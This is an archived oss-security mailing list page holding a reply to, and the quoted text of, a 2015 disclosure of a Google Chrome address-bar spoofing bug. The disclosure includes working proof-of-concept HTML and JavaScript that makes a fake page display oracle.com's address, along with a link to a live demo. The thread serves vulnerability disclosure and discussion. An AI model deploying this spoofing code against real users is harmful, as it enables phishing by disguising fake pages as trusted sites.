@@ -1,0 +1,200 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<title>oss-security - RE: Google Chrome Address Spoofing (Request For Comment)</title>
+
+<link href="/style.css" type="text/css" rel="stylesheet">
+<style type="text/css">
+.calendar { text-align: center; }
+.ccell { background: #ccc; width: 5ex; padding: 2px; }
+
+.cal_brief { text-align: center; }
+.cal_brief td:first-child { background: inherit; }
+.cal_brief td { background: #ccc; width: 5ex; padding: 2px; }
+.cal_big { text-align: center; padding: 0; margin: 0; }
+.cal_big td { padding: 0 2px; }
+.cal_mon { text-align: center; }
+.cal_mon th { font-size: small; padding: 0; margin: 0; }
+.cal_mon td { background: #ccc; width: 5ex; height: 1.5em;
+	padding: 2px; text-align: right; }
+.cal_mon td[colspan] { background: inherit; }
+.cal_mon sup { color: #F0F0F0; text-align: left; float: left;
+	margin-top: -2pt; font-weight: bold; }
+.cal_mon a { text-align: right; margin-left: -4em; float: right; }
+</style>
+</head>
+
+<BODY bgcolor="#E0E0E0" text="black" link="blue" alink="red" vlink="navy">
+
+
+<table bgcolor="#ffffff" width="100%" border="0" cellspacing="0" cellpadding="0">
+<tr>
+
+<td>
+<a href="/"><img class="logo" src="/logo.png" border="0" width="182" height="80" alt="Openwall"></a>
+<td width="100%">
+<div class="nav">
+<ul>
+<li><a href="/">Products</a>
+<ul>
+<li><a href="/Owl/">Openwall GNU/*/Linux &nbsp; <i>server OS</i></a>
+<li><a href="/lkrg/">Linux Kernel Runtime Guard</a>
+<li><a href="/john/">John the Ripper &nbsp; <i>password cracker</i></a>
+<ul>
+<li><a href="/john/">Free &amp; Open Source for any platform</a>
+<li><a href="/john/cloud/">in the cloud</a>
+<li><a href="/john/pro/linux/">Pro for Linux</a>
+<li><a href="/john/pro/macosx/">Pro for macOS</a>
+</ul>
+<li><a href="/wordlists/">Wordlists &nbsp; <i>for password cracking</i></a>
+<li><a href="/passwdqc/">passwdqc &nbsp; <i>policy enforcement</i></a>
+<ul>
+<li><a href="/passwdqc/">Free &amp; Open Source for Unix</a>
+<li><a href="/passwdqc/windows/">Pro for Windows (Active Directory)</a>
+</ul>
+<li><a href="/yescrypt/">yescrypt &nbsp; <i>KDF &amp; password hashing</i></a>
+<li><a href="/yespower/">yespower &nbsp; <i>Proof-of-Work (PoW)</i></a>
+<li><a href="/crypt/">crypt_blowfish &nbsp; <i>password hashing</i></a>
+<li><a href="/phpass/">phpass &nbsp; <i>ditto in PHP</i></a>
+<li><a href="/tcb/">tcb &nbsp; <i>better password shadowing</i></a>
+<li><a href="/pam/">Pluggable Authentication Modules</a>
+<li><a href="/scanlogd/">scanlogd &nbsp; <i>port scan detector</i></a>
+<li><a href="/popa3d/">popa3d &nbsp; <i>tiny POP3 daemon</i></a>
+<li><a href="/blists/">blists &nbsp; <i>web interface to mailing lists</i></a>
+<li><a href="/msulogin/">msulogin &nbsp; <i>single user mode login</i></a>
+<li><a href="/php_mt_seed/">php_mt_seed &nbsp; <i>mt_rand() cracker</i></a>
+</ul>
+<li><a href="/services/">Services</a>
+<li id="narrow-li-1"><a>Publications</a>
+<ul>
+<li><a href="/articles/">Articles</a>
+<li><a href="/presentations/">Presentations</a>
+</ul>
+<li><a>Resources</a>
+<ul>
+<li><a href="/lists/">Mailing lists</a>
+<li><a href="https://openwall.info/wiki/">Community wiki</a>
+<li><a href="https://github.com/openwall">Source code repositories (GitHub)</a>
+<li><a href="/mirrors/">File archive &amp; mirrors</a>
+<li><a href="/signatures/">How to verify digital signatures</a>
+<li><a href="/ove/">OVE IDs</a>
+</ul>
+<li id="last-li"><a href="/news">What's new</a>
+</ul>
+</div>
+
+
+</table>
+
+
+<TABLE bgcolor="#B4D0DC" width="100%" border="0" cellspacing="0" cellpadding="1">
+<TR><TD>
+<TABLE width="100%" border="0" cellspacing="0" cellpadding="2">
+<TR><TD bgcolor="#ECF8FF">
+<a href="https://twitter.com/openwall">
+Follow @Openwall on Twitter for new release announcements and other news</a>
+
+</TABLE>
+</TABLE>
+
+<a href="5">[&lt;prev]</a> <a href="7">[next&gt;]</a> <a href="5">[&lt;thread-prev]</a> <a href="9">[thread-next&gt;]</a> <a href=".">[day]</a> <a href="..">[month]</a> <a href="../..">[year]</a> <a href="../../..">[list]</a>
+<pre style="white-space: pre-wrap">
+Message-ID: &lt;925c3f4ff9a84c9c8d771e8bfb3323f0&#64;MBS05.adsroot.uts.edu.au&gt;
+Date: Tue, 30 Jun 2015 23:54:34 +0000
+From: Zak Siddiqui &lt;Zak.Siddiqui&#64;....edu.au&gt;
+To: David Leo &lt;david.leo&#64;...sen.co.uk&gt;, "bugtraq&#64;...urityfocus.com"
+	&lt;bugtraq&#64;...urityfocus.com&gt;, "fulldisclosure&#64;...lists.org"
+	&lt;fulldisclosure&#64;...lists.org&gt;, "oss-security&#64;...ts.openwall.com"
+	&lt;oss-security&#64;...ts.openwall.com&gt;
+Subject: RE: Google Chrome Address Spoofing (Request For Comment)
+
+Hi David,
+
+Is it reproducible with HTTPS?
+
+Thanks,
+Zak
+
+-----Original Message-----
+From: David Leo [mailto:david.leo&#64;...sen.co.uk] 
+Sent: Tuesday, 30 June 2015 4:08 PM
+To: bugtraq&#64;...urityfocus.com; fulldisclosure&#64;...lists.org; oss-security&#64;...ts.openwall.com
+Subject: Google Chrome Address Spoofing (Request For Comment)
+
+Impact:
+The "click to verify" thing is completely broken...
+Anyone can be "BBB Accredited Business" etc.
+You can make whitehouse.gov display "We love Islamic State" :-)
+
+Note:
+No user interaction on the fake page.
+
+Code:
+***** index.html
+&lt;script&gt;
+function next()
+{
+	w.location.replace('<a href="http://www.oracle.com/index.html?'+n);n++" rel="nofollow">http://www.oracle.com/index.html?'+n);n++</a>;
+	setTimeout("next();",15);
+	setTimeout("next();",25);
+}
+function f()
+{
+	w=window.open("content.html","_blank","width=500 height=500");
+	i=setInterval("try{x=w.location.href;}catch(e){clearInterval(i);n=0;next();}",5);
+}
+&lt;/script&gt;
+&lt;a href="#" onclick="f()"&gt;Go&lt;/a&gt;&lt;br&gt;
+***** content.html
+&lt;b&gt;This web page is NOT oracle.com&lt;/b&gt;
+&lt;script&gt;location="<a href="http://www.oracle.com/index.html" rel="nofollow">http://www.oracle.com/index.html</a>";&lt;/script&gt;
+***** It's online
+<a href="http://www.deusen.co.uk/items/gwhere.6128645971389012/" rel="nofollow">http://www.deusen.co.uk/items/gwhere.6128645971389012/</a>
+(The page says "June/16/2015" - it works as we tested today)
+
+Request For Comment:
+We reported this to Google.
+They reproduced, and say
+It's DoS which doesn't matter.
+We think it's very strange,
+since the browser does not crash(not DoS), and the threat is obvious.
+What's your opinion?
+
+Kind Regards,
+
+PS
+We love clever tricks.
+We love this:
+<a href="http://dieyu.org/" rel="nofollow">http://dieyu.org/</a>
+
+
+
+UTS CRICOS Provider Code: 00099F
+DISCLAIMER: This email message and any accompanying attachments may contain confidential information.
+If you are not the intended recipient, do not read, use, disseminate, distribute or copy this message or
+attachments. If you have received this message in error, please notify the sender immediately and delete
+this message. Any views expressed in this message are those of the individual sender, except where the
+sender expressly, and with authority, states them to be the views of the University of Technology Sydney.
+Before opening any attachments, please check them for viruses and defects.
+
+Think. Green. Do.
+
+Please consider the environment before printing this email.
+</pre>
+<p><a href="https://www.openwall.com/blists/">Powered by blists</a> - <a href="https://lists.openwall.net">more mailing lists</a>
+
+
+<p>
+Please check out the
+<a href="https://oss-security.openwall.org/wiki/">
+Open Source Software Security Wiki</a>, which is counterpart to this
+<a href="https://oss-security.openwall.org/wiki/mailing-lists/oss-security">mailing list</a>.
+<p>
+Confused about <a href="/lists/">mailing lists</a> and their use?
+<a href="https://en.wikipedia.org/wiki/Electronic_mailing_list">Read about mailing lists on Wikipedia</a>
+and check out these
+<a href="https://www.complang.tuwien.ac.at/anton/mail-news-errors.html">guidelines on proper formatting of your messages</a>.
+<p>
+
+</body>
+</html>
